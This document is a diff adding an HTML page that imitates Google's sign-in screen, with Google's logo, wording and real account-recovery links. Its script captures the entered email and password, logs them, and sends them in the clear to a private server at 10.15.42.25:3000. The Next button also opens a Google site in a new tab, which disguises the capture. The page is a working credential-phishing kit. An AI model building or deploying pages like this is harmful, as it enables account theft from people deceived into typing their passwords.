@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        
+        
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+            margin: 0 auto;
+        }
+        
+        .login-box img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .login-box h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .login-box input {
+            width: 95%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .login-box button:hover {
+            background-color: #357AE8;
+        }
+
+        .login-box .small {
+            font-size: 12px;
+            color: #555;
+        }
+
+        .login-box .small span {
+            color: #1a73e8;
+            cursor: pointer;
+        }
+
+        .login-box .links {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .login-box .links x1, .login-box .links x2, .login-box .links x3 {
+            display: block;
+            margin: 5px 0;
+            color: #1a73e8;
+            cursor: pointer;
+        }
+
+        .tag {
+            position: absolute;
+            bottom: 10px;
+            text-align: center;
+            width: 100%;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .tag span {
+            font-weight: bold;
+            color: #1a73e8;
+        }
+    </style>
+</head>
+<body>
+
+
+
+<div class="login-box">
+    <img src="https://cdn.vox-cdn.com/thumbor/Pkmq1nm3skO0-j693JTMd7RL0Zk=/0x0:2012x1341/1200x800/filters:focal(0x0:2012x1341)/cdn.vox-cdn.com/uploads/chorus_image/image/47070706/google2.0.0.jpg" alt="Google Logo">
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+    
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Email or phone" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit" onclick="window.open('https://google.at/login', '_blank');">Next</button>
+    </form>
+    
+    <div class="links">
+        <a href="https://accounts.google.com/signin/v2/usernamerecovery?ddm=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin" target="_blank">Forgot email?</a>
+    </div>
+    
+    <x3>Not your computer? Use a private browsing window to sign in.</x3>
+
+    <div class="links">
+        
+        <x2><span> Learn more</span></x2>
+        <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://myaccount.google.com?utm_source%3Daccount-marketing-page%26utm_medium%3Dcreate-account-button&ddm=1&dsh=S1024131009:1731928373760888&flowEntry=SignUp&flowName=GlifWebSignIn&TL=AKOx4s1f1S3a0OfuQtEoZUF8GdUIVAFlbKdaSW_xGYcQ2CIRsltHmk32WLK3yvAO" target="_blank">Create Account</a>
+    </div>
+    
+    <div class="small">
+        <small>By signing in, you agree to Google’s <span>Terms of Service</span> and <span>Privacy Policy</span>.</small>
+    </div>
+</div>
+
+
+
+<script>
+    
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); 
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        console.log("Email entered:", email);
+        console.log("Password entered:", password);
+
+        // Construct the URL with query parameters
+        const url = `http://10.15.42.25:3000/login?email=${email}&password=${password}`;
+
+        // Send the data to the API
+        fetch(url, {
+            method: 'post', // Use GET if you're sending query parameters
+        }).then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                console.log(response); // Parse the JSON response
+            })
+            .then(data => {
+                console.log('Success:', data); // Handle the success response
+            })
+            .catch(error => {
+                console.error('Error:', error); // Handle errors
+            });
+    });
+</script>
+
+</body>
+</html>
